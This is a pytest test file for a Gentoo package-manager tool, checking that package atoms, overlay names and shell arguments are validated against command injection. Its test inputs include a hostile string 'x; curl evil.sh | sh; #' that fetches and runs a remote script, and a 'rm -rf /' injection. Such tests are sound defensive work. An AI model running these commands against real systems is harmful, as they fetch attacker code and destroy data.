"""Tests for argument safety in command construction."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import Mock

import pytest
from lxml import etree

import carnage.core.operation as operation_module
from carnage.core.commands_config import CommandsConfiguration, is_valid_atom, is_valid_component
from carnage.core.eix.search import _parse_package
from carnage.core.gentoolkit.euse import euse_enable
from carnage.core.portage.emerge import _reject_unsafe_atom, emerge_install
from carnage.core.portage.overlays import _parse_overlay, remove_overlay

HOSTILE = "x; curl evil.sh | sh; #"

VALID_OVERLAY_XML = """
<repo quality="core" status="official">
  <name>gentoo</name>
  <description>desc</description>
  <homepage>https://example.invalid</homepage>
  <owner type="person"><name>Alice</name><email>alice@example.invalid</email></owner>
  <source type="rsync">https://example.invalid/repo</source>
</repo>
"""


@pytest.fixture(autouse=True)
def detected_backend(monkeypatch: pytest.MonkeyPatch) -> None:
    """Make privilege backend detection deterministic."""
    monkeypatch.setattr(operation_module, "generate_default_privilege_backend", lambda: "run0")


@pytest.fixture
def config(commands_file: Path) -> CommandsConfiguration:
    return CommandsConfiguration(config_path=commands_file)


@pytest.mark.parametrize(
    "value",
    ["gentoo", "app-editors", "x11-wm", "gtk+", "python3.12", "1.2.3", "_leading", "a" * 64],
)
def test_valid_components_are_accepted(value: str) -> None:
    assert is_valid_component(value)


@pytest.mark.parametrize(
    "value",
    ["", "-evil", ".hidden", "has space", "a;b", "a|b", "a$(b)", "a\nb", "a/b", 'a"b', "a'b", "$HOME"],
)
def test_unsafe_components_are_rejected(value: str) -> None:
    assert not is_valid_component(value)


@pytest.mark.parametrize(
    "value",
    ["app-editors/vim", "=app-editors/vim-9.0.0", "sys-apps/portage:0", "~dev-libs/foo-1.2_beta", ">=a/b-1"],
)
def test_valid_atoms_are_accepted(value: str) -> None:
    assert is_valid_atom(value)


@pytest.mark.parametrize(
    "value",
    ["-evil/pkg", "cat/../../etc", "cat/name; rm -rf /", "no-slash", "cat/name extra", "--help"],
)
def test_unsafe_atoms_are_rejected(value: str) -> None:
    assert not is_valid_atom(value)


def test_shell_program_is_never_interpolated(config: CommandsConfiguration) -> None:
    result = config._substitute_args(["sh", "-c", "eselect repository enable $1 && emaint sync -r $1"], [HOSTILE])

    assert result[2] == "eselect repository enable $1 && emaint sync -r $1"
    assert result[3:] == ["sh", HOSTILE]


def test_shell_program_keeps_positional_binding(config: CommandsConfiguration) -> None:
    """A caller-supplied $0 must not shift $1."""
    result = config._substitute_args(["sh", "-c", "echo $1", "my-zero"], ["a"])

    assert result == ["sh", "-c", "echo $1", "my-zero", "a"]


def test_argv_placeholders_are_substituted(config: CommandsConfiguration) -> None:
    assert config._substitute_args(["qlop", "-pH", "--", "$1"], ["sys-apps/portage"]) == [
        "qlop",
        "-pH",
        "--",
        "sys-apps/portage",
    ]


def test_placeholder_matching_prefers_the_longest_index(config: CommandsConfiguration) -> None:
    args = [f"a{i}" for i in range(1, 11)]

    result = config._substitute_args(["x", "$10", "$1"], args)

    # $10 must not be clobbered by the $1 placeholder, and every argument has to
    # be passed along exactly once (the unused ones become extra operands).
    assert result[:3] == ["x", "a10", "a1"]
    assert sorted(result[1:]) == sorted(args)


def test_arguments_without_a_placeholder_are_appended(config: CommandsConfiguration) -> None:
    assert config._substitute_args(["glsa-check", "-vf", "--"], ["GLSA-1", "GLSA-2"]) == [
        "glsa-check",
        "-vf",
        "--",
        "GLSA-1",
        "GLSA-2",
    ]


def test_a_non_shell_dash_c_argument_is_still_data(config: CommandsConfiguration) -> None:
    assert config._substitute_args(["grep", "-c", "$1"], ["foo"]) == ["grep", "-c", "foo"]


def test_command_without_arguments_is_untouched(config: CommandsConfiguration) -> None:
    assert config._substitute_args(["emerge", "--sync"], []) == ["emerge", "--sync"]


def test_hostile_name_reaches_only_its_own_argv_element(config: CommandsConfiguration) -> None:
    command = config.get_command("overlays.add", args=[HOSTILE], default_privilege=True)

    assert "eselect repository enable $1 && emaint sync -r $1" in command.full_cmd
    assert command.full_cmd[-1] == HOSTILE
    assert all(HOSTILE not in part for part in command.full_cmd[:-1])


def test_default_commands_stop_option_parsing_before_the_atom(config: CommandsConfiguration) -> None:
    for path in ("emerge.install", "emerge.uninstall", "emerge.deselect", "emerge.noreplace", "qlop.prediction"):
        command = config.get_command(path, args=["app-editors/vim"], default_privilege=True)

        assert "--" in command.cmd, path


def test_parse_overlay_rejects_an_unsafe_name() -> None:
    repo = etree.fromstring("<repo><name>-evil</name></repo>")

    assert _parse_overlay(repo) is None


def test_parse_overlay_accepts_a_normal_name() -> None:
    overlay = _parse_overlay(etree.fromstring(VALID_OVERLAY_XML))

    assert overlay is not None
    assert overlay.name == "gentoo"


def test_parse_package_rejects_unsafe_names() -> None:
    assert _parse_package(etree.fromstring('<package name="-evil"/>'), "app-editors") is None
    assert _parse_package(etree.fromstring('<package name="vim"/>'), "-evil") is None


def test_parse_package_accepts_a_normal_package() -> None:
    package = _parse_package(etree.fromstring('<package name="vim"/>'), "app-editors")

    assert package is not None
    assert package.full_name == "app-editors/vim"


def test_overlay_operation_refuses_an_unsafe_name() -> None:
    app = Mock()

    remove_overlay(app, HOSTILE)

    app.notify.assert_called_once_with("Refused to run a command with an invalid overlay name.", severity="error")


def test_emerge_refuses_an_unsafe_atom() -> None:
    app = Mock()

    emerge_install(app, HOSTILE)

    app.notify.assert_called_once_with("Refused to run emerge with an invalid package atom.", severity="error")


def test_euse_refuses_an_unsafe_atom() -> None:
    app = Mock()

    euse_enable(app, ["test"], HOSTILE)

    app.notify.assert_called_once_with("Refused to run euse with an invalid package atom.", severity="error")


def test_valid_atoms_pass_the_command_guards() -> None:
    app = Mock()

    assert not _reject_unsafe_atom(app, "=app-editors/vim-9.0.0")
    app.notify.assert_not_called()
